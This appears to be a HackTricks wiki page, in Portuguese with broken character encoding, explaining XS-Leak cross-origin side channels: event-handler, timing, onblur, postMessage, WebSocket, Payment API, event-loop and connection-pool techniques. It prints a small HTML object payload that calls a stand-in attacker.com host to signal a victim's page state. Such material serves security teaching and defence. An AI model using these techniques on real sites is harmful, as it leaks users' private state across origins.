# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas comunit√°rias mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

XS-Search √© um m√©todo usado para **extrair informa√ß√µes de origem cruzada** aproveitando **vulnerabilidades de canal lateral**.

Os principais componentes envolvidos neste ataque incluem:

* **Web Vulner√°vel**: O site alvo do qual se pretende extrair informa√ß√µes.
* **Web do Atacante**: O site malicioso criado pelo atacante, que a v√≠tima visita, hospedando a explora√ß√£o.
* **M√©todo de Inclus√£o**: A t√©cnica empregada para incorporar a Web Vulner√°vel na Web do Atacante (por exemplo, window.open, iframe, fetch, tag HTML com href, etc.).
* **T√©cnica de Leak**: T√©cnicas usadas para discernir diferen√ßas no estado da Web Vulner√°vel com base nas informa√ß√µes coletadas atrav√©s do m√©todo de inclus√£o.
* **Estados**: As duas condi√ß√µes potenciais da Web Vulner√°vel, que o atacante visa distinguir.
* **Diferen√ßas Detect√°veis**: Varia√ß√µes observ√°veis nas quais o atacante se baseia para inferir o estado da Web Vulner√°vel.

### Diferen√ßas Detect√°veis

V√°rios aspectos podem ser analisados para diferenciar os estados da Web Vulner√°vel:

* **C√≥digo de Status**: Distinguir entre **v√°rios c√≥digos de status de resposta HTTP** de origem cruzada, como erros de servidor, erros de cliente ou erros de autentica√ß√£o.
* **Uso de API**: Identificar **uso de APIs Web** entre p√°ginas, revelando se uma p√°gina de origem cruzada utiliza uma API Web JavaScript espec√≠fica.
* **Redirecionamentos**: Detectar navega√ß√µes para diferentes p√°ginas, n√£o apenas redirecionamentos HTTP, mas tamb√©m aqueles acionados por JavaScript ou HTML.
* **Conte√∫do da P√°gina**: Observar **varia√ß√µes no corpo da resposta HTTP** ou em sub-recursos da p√°gina, como o **n√∫mero de frames incorporados** ou disparidades de tamanho em imagens.
* **Cabe√ßalho HTTP**: Notar a presen√ßa ou possivelmente o valor de um **cabe√ßalho de resposta HTTP espec√≠fico**, incluindo cabe√ßalhos como X-Frame-Options, Content-Disposition e Cross-Origin-Resource-Policy.
* **Tempo**: Notar disparidades de tempo consistentes entre os dois estados.

### M√©todos de Inclus√£o

* **Elementos HTML**: HTML oferece v√°rios elementos para **inclus√£o de recursos de origem cruzada**, como folhas de estilo, imagens ou scripts, for√ßando o navegador a solicitar um recurso n√£o-HTML. Uma compila√ß√£o de potenciais elementos HTML para esse prop√≥sito pode ser encontrada em [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frames**: Elementos como **iframe**, **object** e **embed** podem incorporar recursos HTML diretamente na p√°gina do atacante. Se a p√°gina **n√£o tiver prote√ß√£o contra framing**, o JavaScript pode acessar o objeto window do recurso emoldurado atrav√©s da propriedade contentWindow.
* **Pop-ups**: O m√©todo **`window.open`** abre um recurso em uma nova aba ou janela, fornecendo um **handle de janela** para o JavaScript interagir com m√©todos e propriedades seguindo o SOP. Pop-ups, frequentemente usados em autentica√ß√£o √∫nica, contornam as restri√ß√µes de framing e cookies de um recurso alvo. No entanto, navegadores modernos restringem a cria√ß√£o de pop-ups a certas a√ß√µes do usu√°rio.
* **Requisi√ß√µes JavaScript**: O JavaScript permite requisi√ß√µes diretas a recursos alvo usando **XMLHttpRequests** ou a **Fetch API**. Esses m√©todos oferecem controle preciso sobre a requisi√ß√£o, como optar por seguir redirecionamentos HTTP.

### T√©cnicas de Leak

* **Manipulador de Eventos**: Uma t√©cnica cl√°ssica de leak em XS-Leaks, onde manipuladores de eventos como **onload** e **onerror** fornecem informa√ß√µes sobre o sucesso ou falha do carregamento de recursos.
* **Mensagens de Erro**: Exce√ß√µes JavaScript ou p√°ginas de erro especiais podem fornecer informa√ß√µes de leak, seja diretamente da mensagem de erro ou diferenciando entre sua presen√ßa e aus√™ncia.
* **Limites Globais**: Limita√ß√µes f√≠sicas de um navegador, como capacidade de mem√≥ria ou outros limites impostos pelo navegador, podem sinalizar quando um limite √© alcan√ßado, servindo como uma t√©cnica de leak.
* **Estado Global**: Intera√ß√µes detect√°veis com os **estados globais** dos navegadores (por exemplo, a interface History) podem ser exploradas. Por exemplo, o **n√∫mero de entradas** no hist√≥rico de um navegador pode oferecer pistas sobre p√°ginas de origem cruzada.
* **Performance API**: Esta API fornece **detalhes de desempenho da p√°gina atual**, incluindo o tempo de rede para o documento e recursos carregados, permitindo infer√™ncias sobre recursos solicitados.
* **Atributos Leg√≠veis**: Alguns atributos HTML s√£o **leg√≠veis de origem cruzada** e podem ser usados como uma t√©cnica de leak. Por exemplo, a propriedade `window.frame.length` permite que o JavaScript conte os frames inclu√≠dos em uma p√°gina da web de origem cruzada.

## Ferramenta e Artigo XSinator

XSinator √© uma ferramenta autom√°tica para **verificar navegadores contra v√°rios XS-Leaks conhecidos** explicados em seu artigo: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Voc√™ pode **acessar a ferramenta em** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Exclu√≠dos**: Tivemos que excluir XS-Leaks que dependem de **service workers**, pois interfeririam em outros leaks no XSinator. Al√©m disso, escolhemos **excluir XS-Leaks que dependem de m√° configura√ß√£o e bugs em um aplicativo web espec√≠fico**. Por exemplo, m√° configura√ß√µes de CrossOrigin Resource Sharing (CORS), vazamento de postMessage ou Cross-Site Scripting. Al√©m disso, exclu√≠mos XS-Leaks baseados em tempo, pois frequentemente sofrem de serem lentos, barulhentos e imprecisos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas comunit√°rias mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **T√©cnicas Baseadas em Tempo**

Algumas das t√©cnicas a seguir v√£o usar tempo como parte do processo para detectar diferen√ßas nos poss√≠veis estados das p√°ginas web. Existem diferentes maneiras de medir o tempo em um navegador web.

**Rel√≥gios**: A API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite que os desenvolvedores obtenham medi√ß√µes de tempo de alta resolu√ß√£o.\
H√° um n√∫mero consider√°vel de APIs que os atacantes podem abusar para criar rel√≥gios impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), anima√ß√µes CSS, e outros.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## T√©cnicas de Manipulador de Eventos

### Onload/Onerror

* **M√©todos de Inclus√£o**: Frames, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumo**: se tentar carregar um recurso, os eventos onerror/onload s√£o acionados quando o recurso √© carregado com sucesso/sem sucesso, √© poss√≠vel descobrir o c√≥digo de status.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

O exemplo de c√≥digo tenta **carregar objetos de scripts do JS**, mas **outras tags** como objetos, folhas de estilo, imagens, √°udios tamb√©m poderiam ser usadas. Al√©m disso, tamb√©m √© poss√≠vel injetar a **tag diretamente** e declarar os eventos `onload` e `onerror` dentro da tag (em vez de injet√°-los do JS).

H√° tamb√©m uma vers√£o sem script deste ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

* **Inclusion Methods**: Elementos HTML
* **Detectable Difference**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** A [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. No entanto, outros rel√≥gios podem ser usados, como a [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que pode identificar tarefas que est√£o em execu√ß√£o por mais de 50ms.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) outro exemplo em:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Esta t√©cnica √© semelhante √† anterior, mas o **atacante** tamb√©m **for√ßar√°** alguma a√ß√£o para levar um **tempo relevante** quando a **resposta for positiva ou negativa** e medir√° esse tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** O rel√≥gio [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pode ser usado para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

O tempo necess√°rio para buscar um recurso pode ser medido utilizando os eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). O evento **`beforeunload`** √© disparado quando o navegador est√° prestes a navegar para uma nova p√°gina, enquanto o evento **`unload`** ocorre quando a navega√ß√£o est√° realmente acontecendo. A diferen√ßa de tempo entre esses dois eventos pode ser calculada para determinar a **dura√ß√£o que o navegador passou buscando o recurso**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** A [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Foi observado que na aus√™ncia de [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), o tempo necess√°rio para uma p√°gina e seus subrecursos serem carregados pela rede pode ser medido por um atacante. Essa medi√ß√£o √© tipicamente poss√≠vel porque o manipulador `onload` de um iframe √© acionado apenas ap√≥s a conclus√£o do carregamento de recursos e da execu√ß√£o de JavaScript. Para contornar a variabilidade introduzida pela execu√ß√£o de scripts, um atacante pode empregar o atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dentro do `<iframe>`. A inclus√£o deste atributo restringe v√°rias funcionalidades, notavelmente a execu√ß√£o de JavaScript, facilitando assim uma medi√ß√£o que √© predominantemente influenciada pelo desempenho da rede.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary**: Se voc√™ conseguir fazer a p√°gina gerar um erro ao acessar o conte√∫do correto e faz√™-la carregar corretamente ao acessar qualquer conte√∫do, ent√£o voc√™ pode criar um loop para extrair todas as informa√ß√µes sem medir o tempo.
* **Code Example**:

Suponha que voc√™ possa **inserir** a **p√°gina** que cont√©m o **conte√∫do secreto** **dentro de um Iframe**.

Voc√™ pode **fazer a v√≠tima procurar** pelo arquivo que cont√©m "_**flag**_" usando um **Iframe** (exploitar um CSRF, por exemplo). Dentro do Iframe, voc√™ sabe que o _**evento onload**_ ser√° **executado sempre pelo menos uma vez**. Ent√£o, voc√™ pode **mudar** a **URL** do **iframe**, mas mudando apenas o **conte√∫do** do **hash** dentro da URL.

Por exemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Se a primeira URL foi **carregada com sucesso**, ent√£o, ao **mudar** a parte do **hash** da URL, o **evento onload** **n√£o ser√° acionado** novamente. Mas **se** a p√°gina teve algum tipo de **erro** ao **carregar**, ent√£o, o **evento onload** ser√° **acionado novamente**.

Ent√£o, voc√™ pode **distinguir entre** uma p√°gina **carregada corretamente** ou uma p√°gina que tem um **erro** ao ser acessada.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary:** Se a **p√°gina** est√° **retornando** o conte√∫do **sens√≠vel**, **ou** um **conte√∫do** que pode ser **controlado** pelo usu√°rio. O usu√°rio pode definir **c√≥digo JS v√°lido no caso negativo**, um **load** em cada tentativa dentro de **`<script>`** tags, ent√£o em casos **negativos** o **c√≥digo** dos atacantes √© **executado**, e em casos **afirmativos** **nada** ser√° executado.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** √© uma medida de seguran√ßa que impede que p√°ginas da web carreguem certos recursos sens√≠veis de origem cruzada para proteger contra ataques como **Spectre**. No entanto, os atacantes podem explorar seu comportamento protetor. Quando uma resposta sujeita ao **CORB** retorna um `Content-Type` _**protegido pelo CORB**_ com `nosniff` e um c√≥digo de status `2xx`, **CORB** remove o corpo e os cabe√ßalhos da resposta. Atacantes que observam isso podem inferir a combina√ß√£o do **c√≥digo de status** (indicando sucesso ou erro) e o `Content-Type` (denotando se est√° protegido pelo **CORB**), levando a uma poss√≠vel **vazamento de informa√ß√µes**.
* **Code Example**:

Verifique o link de mais informa√ß√µes para mais informa√ß√µes sobre o ataque.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Vazamento de dados sens√≠veis do atributo id ou name.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

√â poss√≠vel **carregar uma p√°gina** dentro de um **iframe** e usar o **`#id_value`** para fazer a p√°gina **focar no elemento** do iframe com o id indicado, ent√£o se um sinal **`onblur`** for acionado, o elemento ID existe.\
Voc√™ pode realizar o mesmo ataque com tags **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Coletar informa√ß√µes sens√≠veis de um postMessage ou usar a presen√ßa de postMessages como um or√°culo para saber o status do usu√°rio na p√°gina
* **Code Example**: `Qualquer c√≥digo ouvindo todos os postMessages.`

Aplica√ß√µes frequentemente utilizam [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para se comunicar entre diferentes origens. No entanto, esse m√©todo pode inadvertidamente expor **informa√ß√µes sens√≠veis** se o par√¢metro `targetOrigin` n√£o for especificado corretamente, permitindo que qualquer janela receba as mensagens. Al√©m disso, o simples ato de receber uma mensagem pode atuar como um **or√°culo**; por exemplo, certas mensagens podem ser enviadas apenas para usu√°rios que est√£o logados. Portanto, a presen√ßa ou aus√™ncia dessas mensagens pode revelar informa√ß√µes sobre o estado ou identidade do usu√°rio, como se ele est√° autenticado ou n√£o.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Exaurir o limite de conex√£o WebSocket vaza o n√∫mero de conex√µes WebSocket de uma p√°gina de origem cruzada.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

√â poss√≠vel identificar se, e quantas, **conex√µes WebSocket uma p√°gina alvo utiliza**. Isso permite que um atacante detecte estados de aplica√ß√£o e vaze informa√ß√µes ligadas ao n√∫mero de conex√µes WebSocket.

Se uma **origem** usar a **quantidade m√°xima de objetos de conex√£o WebSocket**, independentemente do estado de suas conex√µes, a cria√ß√£o de **novos objetos resultar√° em exce√ß√µes JavaScript**. Para executar esse ataque, o site atacante abre o site alvo em um pop-up ou iframe e ent√£o, ap√≥s o site alvo ter sido carregado, tenta criar o maior n√∫mero poss√≠vel de conex√µes WebSocket. O **n√∫mero de exce√ß√µes lan√ßadas** √© o **n√∫mero de conex√µes WebSocket usadas pela janela do site alvo**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Detectar Pedido de Pagamento porque apenas um pode estar ativo ao mesmo tempo.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Esse XS-Leak permite que um atacante **detecte quando uma p√°gina de origem cruzada inicia um pedido de pagamento**.

Porque **apenas um pedido de pagamento pode estar ativo** ao mesmo tempo, se o site alvo estiver usando a API de Pedido de Pagamento, quaisquer novas tentativas de usar essa API falhar√£o e causar√£o uma **exce√ß√£o JavaScript**. O atacante pode explorar isso **tentando periodicamente mostrar a interface da API de Pagamento**. Se uma tentativa causar uma exce√ß√£o, o site alvo est√° atualmente usando-a. O atacante pode ocultar essas tentativas peri√≥dicas fechando imediatamente a interface ap√≥s a cria√ß√£o.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Medir o tempo de execu√ß√£o de uma web abusando do loop de eventos JS de thread √∫nica.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript opera em um modelo de concorr√™ncia de [loop de eventos de thread √∫nica](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), significando que **s√≥ pode executar uma tarefa por vez**. Essa caracter√≠stica pode ser explorada para avaliar **quanto tempo o c√≥digo de uma origem diferente leva para executar**. Um atacante pode medir o tempo de execu√ß√£o de seu pr√≥prio c√≥digo no loop de eventos ao despachar continuamente eventos com propriedades fixas. Esses eventos ser√£o processados quando o pool de eventos estiver vazio. Se outras origens tamb√©m estiverem despachando eventos para o mesmo pool, um **atacante pode inferir o tempo que leva para esses eventos externos serem executados observando atrasos na execu√ß√£o de suas pr√≥prias tarefas**. Esse m√©todo de monitoramento do loop de eventos para atrasos pode revelar o tempo de execu√ß√£o do c√≥digo de diferentes origens, potencialmente expondo informa√ß√µes sens√≠veis.

{% hint style="warning" %}
Em um tempo de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medidas mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Um m√©todo para medir o tempo de execu√ß√£o de uma opera√ß√£o web envolve bloquear intencionalmente o loop de eventos de uma thread e ent√£o medir **quanto tempo leva para o loop de eventos ficar dispon√≠vel novamente**. Ao inserir uma opera√ß√£o bloqueadora (como um c√°lculo longo ou uma chamada de API s√≠ncrona) no loop de eventos e monitorar o tempo que leva para o c√≥digo subsequente come√ßar a ser executado, pode-se inferir a dura√ß√£o das tarefas que estavam sendo executadas no loop de eventos durante o per√≠odo de bloqueio. Essa t√©cnica aproveita a natureza de thread √∫nica do loop de eventos do JavaScript, onde as tarefas s√£o executadas sequencialmente, e pode fornecer insights sobre o desempenho ou comportamento de outras opera√ß√µes que compartilham a mesma thread.
* **Code Example**:

Uma vantagem significativa da t√©cnica de medir o tempo de execu√ß√£o bloqueando o loop de eventos √© seu potencial para contornar a **Isola√ß√£o de Site**. **Isola√ß√£o de Site** √© um recurso de seguran√ßa que separa diferentes sites em processos separados, visando impedir que sites maliciosos acessem diretamente dados sens√≠veis de outros sites. No entanto, ao influenciar o tempo de execu√ß√£o de outra origem atrav√©s do loop de eventos compartilhado, um atacante pode indiretamente extrair informa√ß√µes sobre as atividades daquela origem. Esse m√©todo n√£o depende do acesso direto aos dados da outra origem, mas sim observa o impacto das atividades daquela origem no loop de eventos compartilhado, assim evitando as barreiras protetoras estabelecidas pela **Isola√ß√£o de Site**.

{% hint style="warning" %}
Em um tempo de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medidas mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Um atacante poderia bloquear todos os sockets, exceto 1, carregar a web alvo e ao mesmo tempo carregar outra p√°gina, o tempo at√© a √∫ltima p√°gina come√ßar a carregar √© o tempo que a p√°gina alvo levou para carregar.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Os navegadores utilizam sockets para comunica√ß√£o com o servidor, mas devido aos recursos limitados do sistema operacional e hardware, **os navegadores s√£o obrigados a impor um limite** no n√∫mero de sockets concorrentes. Os atacantes podem explorar essa limita√ß√£o atrav√©s dos seguintes passos:

1. Determinar o limite de sockets do navegador, por exemplo, 256 sockets globais.
2. Ocupando 255 sockets por um longo per√≠odo iniciando 255 requisi√ß√µes para v√°rios hosts, projetadas para manter as conex√µes abertas sem completar.
3. Usar o 256¬∫ socket para enviar uma requisi√ß√£o para a p√°gina alvo.
4. Tentar uma 257¬™ requisi√ß√£o para um host diferente. Dado que todos os sockets est√£o em uso (conforme os passos 2 e 3), essa requisi√ß√£o ser√° enfileirada at√© que um socket se torne dispon√≠vel. O atraso antes que essa requisi√ß√£o prossiga fornece ao atacante informa√ß√µes de tempo sobre a atividade de rede relacionada ao socket do 256¬∫ (o socket da p√°gina alvo). Essa infer√™ncia √© poss√≠vel porque os 255 sockets do passo 2 ainda est√£o ocupados, implicando que qualquer socket rec√©m-dispon√≠vel deve ser o liberado do passo 3. O tempo que leva para o 256¬∫ socket se tornar dispon√≠vel est√°, portanto, diretamente ligado ao tempo necess√°rio para a requisi√ß√£o √† p√°gina alvo ser completada.

Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **More info**:
* **Summary:** √â como a t√©cnica anterior, mas em vez de usar todos os sockets, o **Google Chrome** imp√µe um limite de **6 requisi√ß√µes concorrentes para a mesma origem**. Se n√≥s **bloqueamos 5** e ent√£o **lan√ßamos uma 6¬™** requisi√ß√£o, podemos **medir** e se conseguimos fazer a **p√°gina da v√≠tima enviar** mais **requisi√ß√µes** para o mesmo endpoint para detectar um **status** da **p√°gina**, a **6¬™ requisi√ß√£o** levar√° **mais tempo** e podemos detect√°-la.

## Performance API Techniques

A [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) oferece insights sobre as m√©tricas de desempenho de aplica√ß√µes web, ainda mais enriquecida pela [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). A Resource Timing API permite o monitoramento de tempos detalhados de requisi√ß√µes de rede, como a dura√ß√£o das requisi√ß√µes. Notavelmente, quando os servidores incluem o cabe√ßalho `Timing-Allow-Origin: *` em suas respostas, dados adicionais como o tamanho da transfer√™ncia e o tempo de busca de dom√≠nio se tornam dispon√≠veis.

Essa riqueza de dados pode ser recuperada atrav√©s de m√©todos como [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), fornecendo uma vis√£o abrangente das informa√ß√µes relacionadas ao desempenho. Al√©m disso, a API facilita a medi√ß√£o de tempos de execu√ß√£o calculando a diferen√ßa entre timestamps obtidos de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). No entanto, vale a pena notar que para certas opera√ß√µes em navegadores como o Chrome, a precis√£o de `performance.now()` pode ser limitada a milissegundos, o que pode afetar a granularidade das medi√ß√µes de tempo.

